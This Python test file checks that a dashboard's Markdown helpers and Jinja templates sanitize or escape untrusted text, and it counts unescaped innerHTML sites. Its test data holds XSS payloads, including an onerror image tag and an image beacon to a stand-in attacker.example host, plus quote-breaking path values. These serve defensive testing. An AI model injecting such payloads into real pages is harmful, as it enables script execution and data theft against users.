"""Untrusted text must reach the dashboard's pages as text, never as markup or code.

Markdown first. marked passes raw inline HTML through untouched, so its output is only
safe to assign to innerHTML after DOMPurify sanitizes it. `_head.html` owns that rule in
two shared helpers, `renderMarkdown()` and `renderMarkdownInline()`, both of which fall
back to escaping the text when either library failed to load from its CDN.

The spec page once called `marked.parseInline()` itself for open-question text, which
comes from an LLM-written spec built from issue content, so a question carrying an
`<img onerror>` reached innerHTML unsanitized. These tests run the real helpers and the
real `renderQuestions()` under node with stand-in libraries, plus a source guard that
keeps every marked call inside the shared helpers.

Then the spec page's issue number, a free-form path segment written into its script.
Quoting it by hand left a backslash free to escape the closing quote; `tojson` emits a
string literal that holds exactly the path value.
"""

from __future__ import annotations

import json
import re
import shutil
import subprocess
from pathlib import Path
from urllib.parse import quote

import pytest
from httpx import ASGITransport, AsyncClient

_DASHBOARD = Path(__file__).resolve().parents[1] / "sova" / "dashboard"
_HEAD = _DASHBOARD / "templates" / "_head.html"
_APP_JS = _DASHBOARD / "static" / "app.js"
_SPEC = _DASHBOARD / "templates" / "spec.html"

_PAYLOAD = "<img src=x onerror=alert(1)>"
_QUESTION = "Should `retry` cover this? " + _PAYLOAD

# Runs _head.html's inline script and spec.html's renderQuestions() in a vm sandbox.
# The stand-in marked passes inline HTML through as the real one does; the stand-in
# DOMPurify records what it was given and strips <img> tags.
_HARNESS = r"""
const vm = require('vm');
const scenario = JSON.parse(process.argv[2]);
const sanitized = [];
const elements = {
  'questions-section': { classList: { add() {}, remove() {} } },
  'questions-list': { innerHTML: '' },
};
const ctx = {
  console: { log() {}, warn() {}, error() {} },
  document: { getElementById: (id) => elements[id] || null },
};
if (scenario.marked) {
  ctx.marked = {
    use() {},
    parse: (text) => '<p>' + text + '</p>',
    parseInline: (text) => text,
  };
}
if (scenario.purify) {
  ctx.DOMPurify = {
    sanitize(html) { sanitized.push(html); return html.replace(/<img\b[^>]*>/gi, ''); },
  };
}
ctx.window = ctx;
vm.createContext(ctx);
vm.runInContext(scenario.head, ctx);
vm.runInContext(scenario.page, ctx);
const results = scenario.calls.map(([name, ...args]) => ctx[name](...args));
process.stdout.write(JSON.stringify({
  results, sanitized, listHtml: elements['questions-list'].innerHTML,
}));
"""


def _head_script() -> str:
    """The inline script of _head.html (the CDN tags carry a src and no body)."""
    return re.search(r"<script>(.*?)</script>", _HEAD.read_text(encoding="utf-8"), re.DOTALL).group(1)


def _escape_html_source() -> str:
    """escapeHtml() from app.js: _head.html's renderers call it, and base.html loads app.js after the head."""
    source = _APP_JS.read_text(encoding="utf-8")
    start = source.index("function escapeHtml(")
    return source[start : source.index("\n}\n", start) + 2]


def _render_questions_source() -> str:
    """renderQuestions() from spec.html; the rest of that script holds Jinja markup."""
    source = _SPEC.read_text(encoding="utf-8")
    start = source.index("function renderQuestions(questions) {")
    return source[start : source.index("\n}\n", start) + 2]


def _run(tmp_path: Path, *, marked: bool, purify: bool, calls: list[list[object]]) -> dict:
    if shutil.which("node") is None:
        pytest.skip("node is required to run the dashboard template scripts")
    harness = tmp_path / "harness.js"
    harness.write_text(_HARNESS, encoding="utf-8")
    scenario = {
        "head": _escape_html_source() + "\n" + _head_script(),
        "page": _render_questions_source(),
        "marked": marked,
        "purify": purify,
        "calls": calls,
    }
    proc = subprocess.run(
        ["node", str(harness), json.dumps(scenario)],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def _render_question(tmp_path: Path, *, marked: bool, purify: bool) -> dict:
    question = {"id": 1, "text": _QUESTION, "answer": ""}
    return _run(tmp_path, marked=marked, purify=purify, calls=[["renderQuestions", [question]]])


class TestSpecQuestionRendering:
    def test_question_markdown_is_sanitized_before_innerhtml(self, tmp_path: Path) -> None:
        out = _render_question(tmp_path, marked=True, purify=True)

        assert any(_PAYLOAD in html for html in out["sanitized"]), "question HTML never reached DOMPurify"
        assert "onerror" not in out["listHtml"]
        assert "Should `retry` cover this?" in out["listHtml"]

    @pytest.mark.parametrize(("marked", "purify"), [(True, False), (False, True)], ids=["no-dompurify", "no-marked"])
    def test_question_text_is_escaped_when_a_library_failed_to_load(
        self, tmp_path: Path, marked: bool, purify: bool
    ) -> None:
        out = _render_question(tmp_path, marked=marked, purify=purify)

        assert "<img" not in out["listHtml"]
        assert "&lt;img src=x onerror=alert(1)&gt;" in out["listHtml"]


class TestSharedMarkdownHelpers:
    @pytest.mark.parametrize("helper", ["renderMarkdown", "renderMarkdownInline"])
    @pytest.mark.parametrize(
        ("marked", "purify"),
        [(True, True), (True, False), (False, True), (False, False)],
        ids=["both-loaded", "no-dompurify", "no-marked", "neither"],
    )
    def test_raw_html_never_survives(self, tmp_path: Path, helper: str, marked: bool, purify: bool) -> None:
        out = _run(tmp_path, marked=marked, purify=purify, calls=[[helper, _QUESTION]])

        assert "<img" not in out["results"][0]

    @pytest.mark.parametrize(
        ("marked", "purify"),
        [(True, True), (True, False), (False, True), (False, False)],
        ids=["both-loaded", "no-dompurify", "no-marked", "neither"],
    )
    def test_untrusted_markdown_turns_an_image_into_a_link(self, tmp_path: Path, marked: bool, purify: bool) -> None:
        """Agent prose: an image would load its URL on render, so it becomes a link (a DOMPurify without hooks too)."""
        text = '<img src="https://attacker.example/?d=s" alt="x" onerror=alert(1)>'
        out = _run(tmp_path, marked=marked, purify=purify, calls=[["renderMarkdown", text, {"untrusted": True}]])

        result = out["results"][0]
        assert "<img" not in result
        if marked and purify:
            assert '<a href="https://attacker.example/?d=s">x</a>' in result
            assert "onerror" not in result


class TestMarkedCallSites:
    def test_only_the_shared_helpers_call_marked(self) -> None:
        """A page calling marked itself skips DOMPurify, which is how spec.html leaked."""
        call = re.compile(r"\bmarked\.(?:parse|parseInline)\(")
        sources = [*sorted((_DASHBOARD / "templates").glob("*.html")), *sorted((_DASHBOARD / "static").rglob("*.js"))]
        offenders = []
        head_calls = 0
        for path in sources:
            if path.name.endswith(".min.js"):
                continue
            for lineno, line in enumerate(path.read_text(encoding="utf-8").splitlines(), start=1):
                if not call.search(line):
                    continue
                if path == _HEAD:
                    head_calls += 1
                else:
                    offenders.append(f"{path.relative_to(_DASHBOARD)}:{lineno}")

        assert offenders == [], f"call renderMarkdown()/renderMarkdownInline() instead: {offenders}"
        assert head_calls == 2, "expected exactly the two shared helpers in _head.html to call marked"


class TestSpecIssueNumberLiteral:
    @pytest.mark.parametrize("issue_number", ["42", "RHCLOUD-123", "7\\';x", '7"<b>x'])
    async def test_issue_number_is_a_string_literal_holding_the_path_value(
        self, dashboard_app, issue_number: str
    ) -> None:
        async with AsyncClient(transport=ASGITransport(app=dashboard_app), base_url="http://test") as client:
            resp = await client.get("/spec/" + quote(issue_number, safe=""))

        assert resp.status_code == 200
        line = next(line for line in resp.text.splitlines() if "var _issueNumber = " in line)
        literal = line.split("var _issueNumber = ", 1)[1].strip().removesuffix(";")
        assert json.loads(literal) == issue_number
        assert "<" not in literal


class TestNumericPagePathLiterals:
    """The lifecycle and run pages take an integer path value, and write it into their script as a number.

    `lifecycle.html` hands its value to `issueLink()` and then `innerHTML`, so a markup path segment
    must never reach the page: the route answers 422 for it before any template renders.
    """

    @pytest.mark.parametrize(
        ("path", "var"), [("/lifecycle/42", "_ISSUE_NUMBER"), ("/work/7", "_RUN_ID")], ids=["lifecycle", "run"]
    )
    async def test_the_value_is_a_number_literal(self, dashboard_app, path: str, var: str) -> None:
        async with AsyncClient(transport=ASGITransport(app=dashboard_app), base_url="http://test") as client:
            resp = await client.get(path)
        assert resp.status_code == 200
        line = next(line for line in resp.text.splitlines() if f"var {var} = " in line)
        assert isinstance(json.loads(line.split(" = ", 1)[1].strip().removesuffix(";")), int)

    @pytest.mark.parametrize("prefix", ["/lifecycle/", "/work/"])
    async def test_a_markup_path_segment_renders_no_page(self, dashboard_app, prefix: str) -> None:
        async with AsyncClient(transport=ASGITransport(app=dashboard_app), base_url="http://test") as client:
            resp = await client.get(prefix + quote(_PAYLOAD, safe=""))
        # FastAPI's validation error echoes the input, but as JSON under nosniff, never as a page.
        assert resp.status_code == 422
        assert resp.headers["content-type"] == "application/json"
        assert resp.headers["x-content-type-options"] == "nosniff"


# A Jinja value written into a JS string by hand: autoescaping is for HTML, so a backslash or a
# quote in the value ends the literal early, and inside a template literal a `${...}` in the value
# runs as code. `|tojson` emits the whole literal instead, so it must stand outside any quotes too:
# `"{{ x|tojson }}"` nests the value's own quotes inside the author's.
_SCRIPT_BLOCK_RE = re.compile(r"<script\b[^>]*>(.*?)</script>", re.DOTALL)
_JINJA_TAGS = {"{{": "}}", "{%": "%}", "{#": "#}"}
# A `/` after one of these (or at the start) opens a regex literal, not a division. A heuristic, not a
# JS parser: `return /x/` and a regex after `)` (`if (a) /x/.test(b)`) are read as division, which
# can only make the scan miss a literal after them, never invent one.
_REGEX_PRECEDERS = frozenset("(,=:[!&|?{};+-*%<>~^")
# An inline event handler (`onclick="..."`): HTML autoescaping turns `'` into `&#39;`, which the parser
# decodes back before the JS runs, and `|tojson`'s double quotes end a double-quoted attribute, so no
# Jinja value belongs in one. A `data-*` attribute read by the handler is the safe pattern.
_EVENT_HANDLER_RE = re.compile(r"""\son[a-z]+\s*=\s*("[^"]*"|'[^']*'|(?:\{\{.*?\}\}|[^\s>])+)""", re.IGNORECASE)


def _skip_regex(script: str, pos: int) -> int:
    """Index just past the regex literal that starts at `pos`, or past the line when it never closes."""
    end = pos + 1
    in_class = False
    while end < len(script) and script[end] != "\n":
        ch = script[end]
        if ch == "\\":
            end += 2
            continue
        if ch == "[":
            in_class = True
        elif ch == "]":
            in_class = False
        elif ch == "/" and not in_class:
            return end + 1
        end += 1
    return end


def _js_string_literals(script: str) -> list[str]:
    """Every '...', "..." and `...` literal in `script`, skipping comments, regex literals and Jinja tags."""
    literals: list[str] = []
    pos = 0
    previous = ""
    while pos < len(script):
        ch = script[pos]
        opener = script[pos : pos + 2]
        if opener in _JINJA_TAGS:
            close = script.find(_JINJA_TAGS[opener], pos + 2)
            pos = len(script) if close < 0 else close + 2
            previous = "x"
            continue
        if opener == "//":
            newline = script.find("\n", pos)
            pos = len(script) if newline < 0 else newline
            continue
        if opener == "/*":
            close = script.find("*/", pos + 2)
            pos = len(script) if close < 0 else close + 2
            continue
        if ch == "/" and (not previous or previous in _REGEX_PRECEDERS):
            pos = _skip_regex(script, pos)
            previous = "x"
            continue
        if ch in "'\"`":
            end = _skip_string(script, pos)
            literals.append(script[pos:end])
            pos = end
            previous = "x"
            continue
        if not ch.isspace():
            previous = ch
        pos += 1
    return literals


def _jinja_in_event_handlers(text: str) -> list[str]:
    """Every inline event-handler attribute outside a <script> block of `text` that holds a `{{ ... }}`."""
    html = _SCRIPT_BLOCK_RE.sub("", text)
    return [m.group(0).strip() for m in _EVENT_HANDLER_RE.finditer(html) if "{{" in m.group(1)]


def _quoted_jinja_in_scripts(text: str) -> list[str]:
    """Every JS string literal inside a <script> block of `text` that holds a `{{ ... }}`, `|tojson` or not."""
    return [
        literal
        for block in _SCRIPT_BLOCK_RE.finditer(text)
        for literal in _js_string_literals(block.group(1))
        if "{{" in literal
    ]


class TestScriptBlockJinjaLiterals:
    def test_no_template_quotes_a_jinja_value_inside_a_script(self) -> None:
        offenders = [
            f"{path.relative_to(_DASHBOARD)}: {site}"
            for path in sorted((_DASHBOARD / "templates").rglob("*.html"))
            for site in _quoted_jinja_in_scripts(path.read_text(encoding="utf-8"))
        ]
        assert offenders == [], "use {{ value|tojson }} instead of quoting a Jinja value in a script"

    def test_no_template_puts_a_jinja_value_in_an_event_handler(self) -> None:
        offenders = [
            f"{path.relative_to(_DASHBOARD)}: {site}"
            for path in sorted((_DASHBOARD / "templates").rglob("*.html"))
            for site in _jinja_in_event_handlers(path.read_text(encoding="utf-8"))
        ]
        assert offenders == [], "pass the value in a data-* attribute and read it in the handler"

    @pytest.mark.parametrize(
        ("source", "expected"),
        [
            ("""<button onclick="go('{{ x }}')">a</button>""", ["""onclick="go('{{ x }}')\""""]),
            ("<a onmouseover='f({{ x|tojson }})'>a</a>", ["onmouseover='f({{ x|tojson }})'"]),
            ("<a ONCLICK={{ x }}>a</a>", ["ONCLICK={{ x }}"]),
            ('<button onclick="go(this.dataset.id)" data-id="{{ x }}">a</button>', []),
            ("""<script>el.innerHTML = '<b onclick="f()">' + n;</script>""", []),
        ],
        ids=["double-quoted", "tojson-single-quoted", "unquoted", "data-attribute", "inside-script"],
    )
    def test_handler_scan_flags_any_jinja_value(self, source: str, expected: list[str]) -> None:
        assert _jinja_in_event_handlers(source) == expected

    @pytest.mark.parametrize(
        ("source", "expected"),
        [
            ("<script>var a = '{{ x }}';</script>", ["'{{ x }}'"]),
            ('<script type="module">fetch("/w/{{ run_id }}/x");</script>', ['"/w/{{ run_id }}/x"']),
            ("<script>var a = {{ x|tojson }};</script>", []),
            ("<p title='{{ x }}'></p><script>var a = 1;</script>", []),
            ("<script>var a = `{{ x }}`;</script>", ["`{{ x }}`"]),
            ("<script>var a = `<b>${n}</b>{{ x }}`;</script>", ["`<b>${n}</b>{{ x }}`"]),
            ('<script>var a = "it\'s {{ x }}";</script>', ['"it\'s {{ x }}"']),
            ("<script>var a = 'say \"{{ x }}\"';</script>", ["'say \"{{ x }}\"'"]),
            ('<script>var a = "{{ x|tojson }}";</script>', ['"{{ x|tojson }}"']),
            ('<script>fetch("/w/" + {{ id|tojson }} + "/x");</script>', []),
            ("<script>var a = {{ url_for('x')|tojson }}; // don't\nvar b = 'ok';</script>", []),
            ("<script>/* it's */ var a = {% if y == 'z' %}1{% endif %};</script>", []),
            ("<script>var r = /['\"]/g; var a = '{{ x }}';</script>", ["'{{ x }}'"]),
            ("<script>var r = s.replace(/\\//g, ''); var a = '{{ x }}';</script>", ["'{{ x }}'"]),
            ("<script>var r = /[/'] // x/; var a = '{{ x }}';</script>", ["'{{ x }}'"]),
            ("<script>var h = w / 2; var a = '{{ x }}';</script>", ["'{{ x }}'"]),
        ],
    )
    def test_scan_finds_only_unencoded_quoted_values(self, source: str, expected: list[str]) -> None:
        assert _quoted_jinja_in_scripts(source) == expected


# ---------------------------------------------------------------------------
# innerHTML ratchet
#
# Third-party strings (directory names on disk, Jira status names) reach the DOM through
# innerHTML in setup.html, so those sites escape with esc(). The remaining pages render
# server-owned or already-escaped values and are not rewritten here; the ratchet only
# stops the count of unescaped interpolations from growing.
#
# An "interpolation" is a `${...}` group, or an operand of a `+` concatenation, inside an
# `innerHTML =` / `innerHTML +=` statement (its line through the terminating `;`). It counts
# as unescaped unless it starts with an escape helper call, or is provably inert: a number,
# a `.length`, or a ternary between two string literals. The count is per interpolation, so
# adding one raw value to a statement that already escapes another still moves it.
# Scope: every template and every non-minified static script.
# ---------------------------------------------------------------------------

_INNERHTML_ASSIGN_RE = re.compile(r"\.innerHTML\s*\+?=")
# The component builders (app.js) escape every text argument themselves, so a call to one is as safe as esc().
# sovaBtn() is handled apart: it escapes its label but inserts `opts.iconHtml` as markup (_sova_btn_icon_values).
_ESCAPE_CALL_RE = re.compile(r"^(?:esc|escapeHtml|escapeJsStr|emptyStateHtml|badgeHtml|statCardHtml)\(")
_SOVA_BTN_CALL = "sovaBtn("
_ICON_HTML_KEY_RE = re.compile(r"""(?<![\w$])["']?iconHtml["']?\s*:""")
# The shorthand `{iconHtml}` / `{iconHtml, size}`: the option's value is the variable of that name.
_ICON_HTML_SHORTHAND_RE = re.compile(r"(?<![\w$.'\"])iconHtml\s*(?=[,}])")
_INERT_RE = re.compile(
    r"""^(?:
        \d+(?:\.\d+)?                                   # number literal
        |[\w.]+\.length                                 # a count
    )$""",
    re.VERBOSE,
)

# Unescaped interpolations across all templates and static scripts, as measured by this
# section's own helpers when the ratchet was added. Lower it when a site is fixed; never
# raise it: wrap the value in esc().
_INNERHTML_BASELINE = 189


def _skip_string(text: str, pos: int) -> int:
    """Index just past the quoted string or template literal that starts at `pos`."""
    quote_char = text[pos]
    end = pos + 1
    while end < len(text) and text[end] != quote_char:
        if text[end] == "\\":
            end += 2
        elif quote_char == "`" and text.startswith("${", end):
            end = _matching_end(text, end + 2, "{", "}")
        else:
            end += 1
    return end + 1


def _matching_end(text: str, start: int, opener: str, closer: str) -> int:
    """Index just past the `closer` matching an `opener` that sits just before `start` (len(text) if unbalanced)."""
    depth = 1
    pos = start
    while pos < len(text) and depth:
        ch = text[pos]
        if ch in "'\"`":
            pos = _skip_string(text, pos)
            continue
        if text.startswith("//", pos):
            newline = text.find("\n", pos)
            pos = len(text) if newline < 0 else newline
            continue
        if ch == opener:
            depth += 1
        elif ch == closer:
            depth -= 1
        pos += 1
    return pos


def _innerhtml_statements(source: str) -> list[tuple[int, str]]:
    """Return (line number, statement text) for every innerHTML assignment.

    A statement runs to the first `;` outside any string, template literal or bracket, so a
    multi-statement function body inside `.map(...)` stays part of it.
    """
    found: list[tuple[int, str]] = []
    for match in _INNERHTML_ASSIGN_RE.finditer(source):
        pos = match.end()
        while pos < len(source) and source[pos] != ";":
            ch = source[pos]
            if ch in "'\"`":
                pos = _skip_string(source, pos)
            elif ch in "([{":
                pos = _matching_end(source, pos + 1, ch, {"(": ")", "[": "]", "{": "}"}[ch])
            else:
                pos += 1
        found.append((source.count("\n", 0, match.start()) + 1, source[match.end() : pos]))
    return found


def _template_interpolations(literal_body: str) -> list[str]:
    """The `${...}` expressions directly inside one template literal body."""
    exprs: list[str] = []
    pos = 0
    while (start := literal_body.find("${", pos)) >= 0:
        end = _matching_end(literal_body, start + 2, "{", "}")
        exprs.append(literal_body[start + 2 : end - 1].strip())
        pos = end
    return exprs


def _concat_operands(statement: str) -> tuple[list[str], list[str]]:
    """Split a statement into top-level `+` operands; return (non-literal operands, template literal bodies)."""
    operands: list[str] = []
    templates: list[str] = []
    current: list[str] = []
    pos = 0
    text = statement.strip().removesuffix(";").strip()
    while pos < len(text):
        ch = text[pos]
        if ch in "'\"":
            end = pos + 1
            while end < len(text) and text[end] != ch:
                end += 2 if text[end] == "\\" else 1
            current.append(text[pos : end + 1])
            pos = end + 1
        elif ch == "`":
            end = pos + 1
            while end < len(text) and text[end] != "`":
                if text[end] == "\\":
                    end += 2
                elif text.startswith("${", end):
                    end = _matching_end(text, end + 2, "{", "}")
                else:
                    end += 1
            templates.append(text[pos + 1 : end])
            current.append("`T`")
            pos = end + 1
        elif ch in "([{":
            close = {"(": ")", "[": "]", "{": "}"}[ch]
            end = _matching_end(text, pos + 1, ch, close)
            current.append(text[pos:end])
            pos = end
        elif ch == "+":
            operands.append("".join(current).strip())
            current = []
            pos += 1
        else:
            current.append(ch)
            pos += 1
    operands.append("".join(current).strip())
    return operands, templates


def _is_literal_operand(operand: str) -> bool:
    return operand == "`T`" or (len(operand) >= 2 and operand[0] in "'\"" and operand[-1] == operand[0])


def _find_templates(text: str) -> list[str]:
    """Bodies of the outermost template literals in `text`, skipping quoted strings."""
    bodies: list[str] = []
    pos = 0
    while pos < len(text):
        ch = text[pos]
        if ch in "'\"":
            end = pos + 1
            while end < len(text) and text[end] != ch:
                end += 2 if text[end] == "\\" else 1
            pos = end + 1
        elif ch == "`":
            end = pos + 1
            while end < len(text) and text[end] != "`":
                if text[end] == "\\":
                    end += 2
                elif text.startswith("${", end):
                    end = _matching_end(text, end + 2, "{", "}")
                else:
                    end += 1
            bodies.append(text[pos + 1 : end])
            pos = end + 1
        else:
            pos += 1
    return bodies


def _is_literal_ternary(expr: str) -> bool:
    """True for a string literal, or a `cond ? a : b` whose every branch is one (parenthesised or nested)."""
    expr = expr.strip()
    if len(expr) >= 2 and expr[0] in "'\"" and _skip_string(expr, 0) == len(expr):
        return True
    if expr.startswith("(") and _matching_end(expr, 1, "(", ")") == len(expr):
        return _is_literal_ternary(expr[1:-1])
    depth = 0
    question = -1
    pos = 0
    while pos < len(expr):
        ch = expr[pos]
        if ch in "'\"`":
            pos = _skip_string(expr, pos)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif depth == 0 and ch == "?" and question < 0:
            question = pos
        elif depth == 0 and ch == ":" and question >= 0:
            return _is_literal_ternary(expr[question + 1 : pos]) and _is_literal_ternary(expr[pos + 1 :])
        pos += 1
    return False


def _object_value_end(text: str, pos: int) -> int:
    """Index of the `,`, `}` or `)` that ends the object-literal value starting at `pos`."""
    closers = {"(": ")", "[": "]", "{": "}"}
    while pos < len(text) and text[pos] not in ",})":
        ch = text[pos]
        if ch in "'\"`":
            pos = _skip_string(text, pos)
        elif ch in closers:
            pos = _matching_end(text, pos + 1, ch, closers[ch])
        else:
            pos += 1
    return pos


def _call_arguments(args: str) -> list[str]:
    """The top-level, comma-separated arguments of a call's argument text."""
    parts, pos = [], 0
    while pos < len(args):
        end = _object_value_end(args, pos)
        parts.append(args[pos:end].strip())
        pos = end + 1
    return parts


def _sova_btn_icon_values(args: str) -> list[str]:
    """The `iconHtml` values of a `sovaBtn(...)` call's argument text: sovaBtn() inserts them without escaping.

    Options passed as anything but an object literal (`sovaBtn('Run', opts)`) cannot be checked, so the whole
    options expression counts as one value.
    """
    parts = _call_arguments(args)
    if len(parts) < 2 or not parts[1]:
        return []
    opts = parts[1]
    if not opts.startswith("{"):
        return [opts]
    values = [opts[m.end() : _object_value_end(opts, m.end())].strip() for m in _ICON_HTML_KEY_RE.finditer(opts)]
    # A spread (`{...opts, size: 'xs'}`) can carry an iconHtml of its own, so its source counts as one value.
    spreads = [entry[3:].strip() for entry in _call_arguments(opts[1:-1]) if entry.startswith("...")]
    return values + ["iconHtml" for _ in _ICON_HTML_SHORTHAND_RE.finditer(opts)] + spreads


def _trusted_call_rest(expr: str) -> tuple[list[str], str] | None:
    """For an expression that starts with an escape call or a component builder: the values that call leaves
    unescaped, and the text after its closing paren (`esc(a) + raw` leaves `+ raw`). None for any other expression.
    """
    if _ESCAPE_CALL_RE.match(expr):
        open_paren = expr.index("(") + 1
        end = _matching_end(expr, open_paren, "(", ")")
        return [], expr[end:]
    if expr.startswith(_SOVA_BTN_CALL):
        open_paren = len(_SOVA_BTN_CALL)
        end = _matching_end(expr, open_paren, "(", ")")
        values = _sova_btn_icon_values(expr[open_paren : end - 1])
        icons = [e for value in values for e in _unescaped_in_expression(value)]
        return icons, expr[end:]
    return None


def _method_chain_rest(rest: str) -> tuple[list[str], str]:
    """For the text after a trusted call that starts a method chain (`.replace(/x/g, raw).trim()`): the unescaped
    values among the chained calls' arguments, and the text after the chain. A string or regex literal argument is
    inert; any other argument (`esc(a).replace('x', raw)` inserts `raw` as markup) is judged on its own.
    """
    found: list[str] = []
    pos = 0
    while pos < len(rest) and rest[pos] == ".":
        pos += 1
        while pos < len(rest) and (rest[pos].isalnum() or rest[pos] in "_$"):
            pos += 1
        if rest.startswith("(", pos):
            end = _matching_end(rest, pos + 1, "(", ")")
            for arg in _call_arguments(rest[pos + 1 : end - 1]):
                if arg and not arg.startswith("/"):
                    found += _unescaped_in_expression(arg)
            pos = end
    return found, rest[pos:].strip()


def _unescaped_in_expression(expr: str) -> list[str]:
    """Unescaped values in one interpolated expression.

    An expression that builds markup (it holds template literals, e.g. `rows.map(r => `<td>${r}</td>`)`)
    is judged by the interpolations of those literals. Anything else is a raw value unless it is an
    escape call or inert. A call that builds markup with `+` inside a function body is not analyzed
    and counts as one raw value.
    """
    if _INERT_RE.match(expr) or _is_literal_ternary(expr):
        return []
    trusted = _trusted_call_rest(expr)
    if trusted is not None:
        found, rest = trusted
        rest = rest.strip()
        # A method chained on the escaped result (`esc(a).replace(...)`) stays escaped except for its own
        # arguments; anything joined to it (`badgeHtml(a) + raw`) is judged on its own.
        if rest.startswith("."):
            chained, rest = _method_chain_rest(rest)
            found += chained
        if rest.startswith("+"):
            found += _unescaped_in_expression(rest[1:].strip())
        elif rest and not rest.startswith("."):
            found.append(rest)
        return found
    nested = _find_templates(expr)
    if nested:
        return [
            e for body in nested for inner in _template_interpolations(body) for e in _unescaped_in_expression(inner)
        ]
    return [expr]


def _unescaped_interpolations(statement: str) -> list[str]:
    operands, templates = _concat_operands(statement)
    found = [e for op in operands if op and not _is_literal_operand(op) for e in _unescaped_in_expression(op)]
    for body in templates:
        found.extend(e for inner in _template_interpolations(body) for e in _unescaped_in_expression(inner))
    return found


# Expressions in setup.html that are pre-built from escaped or literal pieces and so are audited by hand:
# `crumbs` holds only literals and esc() calls, `badges` only literals.
_SETUP_PREBUILT = {"crumbs.join('')", "badges.join('')"}


def _innerhtml_sources() -> list[Path]:
    templates = sorted((_DASHBOARD / "templates").glob("*.html"))
    scripts = sorted(p for p in (_DASHBOARD / "static").rglob("*.js") if not p.name.endswith(".min.js"))
    return [*templates, *scripts]


def _unescaped_sites(path: Path) -> list[str]:
    sites = []
    for lineno, statement in _innerhtml_statements(path.read_text(encoding="utf-8")):
        sites.extend(f"{path.name}:{lineno}: {expr[:60]}" for expr in _unescaped_interpolations(statement))
    return sites


class TestInnerHtmlRatchet:
    def test_unescaped_interpolations_do_not_grow(self) -> None:
        sites = [site for path in _innerhtml_sources() for site in _unescaped_sites(path)]
        assert len(sites) <= _INNERHTML_BASELINE, (
            f"{len(sites)} unescaped innerHTML interpolations, baseline is {_INNERHTML_BASELINE}. "
            f"Wrap interpolated values in esc(). Sites: {sites}"
        )

    def test_setup_template_has_no_unescaped_interpolations(self) -> None:
        """setup.html renders directory names and Jira status names: no interpolation may be raw."""
        path = _DASHBOARD / "templates" / "setup.html"
        raw = [site for site in _unescaped_sites(path) if site.split(": ", 1)[1] not in _SETUP_PREBUILT]
        assert raw == []

    def test_one_raw_value_in_an_escaping_statement_is_counted(self) -> None:
        """The blind spot of a per-statement check: an esc() elsewhere must not excuse a raw value."""
        assert _unescaped_interpolations("`<b>${esc(a)}</b>${b}`;") == ["b"]
        assert _unescaped_interpolations("'<b>' + esc(a) + '</b>' + b;") == ["b"]
        assert _unescaped_interpolations("`<b>${esc(a)}</b>${n.length}${x ? 'a' : 'b'}`;") == []
        assert _unescaped_interpolations("`${rows.map(r => `<i>${esc(r)}</i><u>${r.id}</u>`).join('')}`;") == ["r.id"]

    @pytest.mark.parametrize(
        ("statement", "expected"),
        [
            ("sovaBtn(label, {variant: 'primary', attrs: {'data-id': id}});", []),
            ("sovaBtn('Run', {iconHtml: '<svg></svg>'});", []),
            ("sovaBtn('Run', {iconHtml: payload});", ["payload"]),
            ("'<div>' + sovaBtn('Run', {variant: 'primary', iconHtml: icon(x)}) + '</div>';", ["icon(x)"]),
            ("`${sovaBtn('Run', {'iconHtml': `<i>${raw}</i>`, size: 'xs'})}`;", ["raw"]),
            ("sovaBtn('Run', {iconHtml: esc(payload)});", []),
            ("sovaBtn('Run', {iconHtml, size: 'xs'});", ["iconHtml"]),
            ("sovaBtn('Run', {size: 'xs', iconHtml});", ["iconHtml"]),
            ("sovaBtn('Run', opts);", ["opts"]),
            ("sovaBtn('Run', {...opts});", ["opts"]),
            ("sovaBtn('Run', {size: 'xs', ...base, variant: 'ghost'});", ["base"]),
            ("sovaBtn('Run');", []),
            ("`${sovaBtn('Run') + payload}`;", ["payload"]),
            ("`${sovaBtn('Run', {iconHtml: icon}) + payload}`;", ["icon", "payload"]),
        ],
    )
    def test_sova_btn_counts_its_unescaped_icon_html(self, statement: str, expected: list[str]) -> None:
        """sovaBtn() escapes its label but not opts.iconHtml, so a raw icon value still counts."""
        assert _unescaped_interpolations(statement) == expected

    @pytest.mark.parametrize(
        ("statement", "expected"),
        [
            ("`${badgeHtml(a, {color: 'red'})}`;", []),
            ("`${badgeHtml(a) + raw}`;", ["raw"]),
            ("`${emptyStateHtml(a) + '<b>' + raw}`;", ["'<b>' + raw"]),
            ("`${statCardHtml(a, 'id')}${raw}`;", ["raw"]),
            ("`${esc(a) + raw}`;", ["raw"]),
            ("`${esc(a).replace(/\\n/g, '<br>')}`;", []),
            ("`${badgeHtml(a).replace('x', raw)}`;", ["raw"]),
            ("`${esc(a).replace('x', esc(b)).trim()}`;", []),
            ("`${esc(a).trim() + raw}`;", ["raw"]),
        ],
    )
    def test_a_builder_call_is_trusted_only_for_its_own_span(self, statement: str, expected: list[str]) -> None:
        """An escape call or component builder covers its own result, never a value joined to it."""
        assert _unescaped_interpolations(statement) == expected

    def test_setup_template_has_no_inline_handlers_built_from_data(self) -> None:
        """Paths and names ride in data attributes with delegated handlers, never in inline JS."""
        source = (_DASHBOARD / "templates" / "setup.html").read_text(encoding="utf-8")
        assert "browseTo('${" not in source
        assert "selectProject('${" not in source
        assert "browseTo(\\'" not in source

    def test_setup_template_named_expressions_are_escaped(self) -> None:
        source = (_DASHBOARD / "templates" / "setup.html").read_text(encoding="utf-8")
        for expr in ("e.name", "e.path", "s.name", "s.category", "slug", "part", "crumbPath"):
            assert not re.search(rf"\$\{{\s*{re.escape(expr)}\s*\}}", source), f"unescaped ${{{expr}}} in setup.html"

    def test_setup_template_does_not_hardcode_the_initial_browse_root(self) -> None:
        """The first browse sends an empty path so the server picks the first allowed root."""
        source = (_DASHBOARD / "templates" / "setup.html").read_text(encoding="utf-8")
        assert "browseTo('~')" not in source
        assert "browseTo('');" in source

    def test_setup_breadcrumb_only_offers_reachable_ancestors(self) -> None:
        source = (_DASHBOARD / "templates" / "setup.html").read_text(encoding="utf-8")
        assert "data.root" in source
